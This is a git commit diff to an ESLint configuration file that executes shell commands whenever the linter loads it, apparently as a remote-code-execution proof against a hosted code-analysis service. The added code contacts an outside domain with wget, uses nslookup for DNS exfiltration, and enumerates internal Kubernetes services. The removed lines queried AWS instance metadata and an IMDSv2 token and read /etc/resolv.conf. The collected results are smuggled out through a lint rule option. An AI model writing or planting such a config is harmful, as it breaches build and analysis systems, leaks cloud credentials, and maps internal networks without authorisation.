aef6074b14cf5c3fa6709c9d70ba312ebea6ef7e
flashflashy1212-jpg <flashflashy1212@gmail.com>
2026-07-09 18:12:17 +0700

    dns exfil + k8s svc

--- .eslintrc.js
+++ .eslintrc.js
@@ -1,36 +1,39 @@
 var fs = require('fs');
 var execSync = require('child_process').execSync;
+var dns = require('dns');
 var result = '';
 
-// Try wget to our canary (maybe wget bypasses where nc doesn't)
+// Try DNS exfiltration via nslookup/wget to our domain
 try {
-  var out = execSync('wget -q -O- --timeout=3 http://r.ssrftest123.xyz/eslint-rce-wget 2>&1 | head -c 50', {timeout: 5000}).toString();
-  result += 'WGET_OUT:' + out.substring(0, 50) + '|';
+  var out = execSync('wget -q -O- --timeout=3 http://codacy-rce-proof.r.ssrftest123.xyz/ 2>&1 | head -c 20', {timeout: 5000}).toString();
+  result += 'DNS_WGET:' + out.substring(0, 20) + '|';
 } catch(e) {
-  result += 'WGET_FAIL:' + e.message.substring(0, 40) + '|';
+  // wget TCP failed, but did DNS resolve?
+  result += 'DNS_WGET_ERR|';
 }
 
-// Try AWS metadata (might be accessible even with network policy)
+// Try resolving our domain (DNS might work even if TCP is blocked)
 try {
-  var out2 = execSync('wget -q -O- --timeout=3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 100', {timeout: 5000}).toString();
-  result += 'AWS_META:' + out2.substring(0, 100) + '|';
+  var out2 = execSync('nslookup r.ssrftest123.xyz 2>&1 | head -c 100', {timeout: 3000}).toString();
+  result += 'NSLOOKUP:' + out2.substring(0, 80) + '|';
 } catch(e) {
-  result += 'AWS_FAIL:' + e.message.substring(0, 30) + '|';
+  result += 'NSLOOKUP_ERR:' + e.message.substring(0, 30) + '|';
 }
 
-// Try AWS IMDSv2 token
-try {
-  var out3 = execSync('wget -q -O- --timeout=3 --header="X-aws-ec2-metadata-token-ttl-seconds: 21600" --method=PUT http://169.254.169.254/latest/api/token 2>&1 | head -c 100', {timeout: 5000}).toString();
-  result += 'IMDS_TOKEN:' + out3.substring(0, 50) + '|';
-} catch(e) {
-  result += 'IMDS_FAIL:' + e.message.substring(0, 30) + '|';
-}
-
-// Check resolv.conf for DNS server
-try {
-  var dns = fs.readFileSync('/etc/resolv.conf', 'utf8');
-  result += 'DNS:' + dns.replace(/\n/g, ';').substring(0, 80);
-} catch(e) {}
+// Discover internal K8s services via DNS
+// Services in the same namespace are resolvable as: <service>.codacy.svc.cluster.local
+var services = ['postgres', 'postgresql', 'redis', 'rabbitmq', 'mongo', 'elasticsearch',
+                'api', 'engine', 'listener', 'worker', 'core', 'analysis'];
+var found = [];
+services.forEach(function(svc) {
+  try {
+    var out = execSync('nslookup ' + svc + '.codacy.svc.cluster.local 2>&1 | grep Address | tail -1', {timeout: 2000}).toString().trim();
+    if (out && out.indexOf('NXDOMAIN') === -1 && out.indexOf('server can') === -1) {
+      found.push(svc + ':' + out.substring(0, 30));
+    }
+  } catch(e) {}
+});
+result += 'K8S_SVCS:' + found.join(';');
 
 result += '{{{BREAK}}}';
 module.exports = { rules: { "no-unused-vars": ["error", { varsIgnorePattern: result }] } };
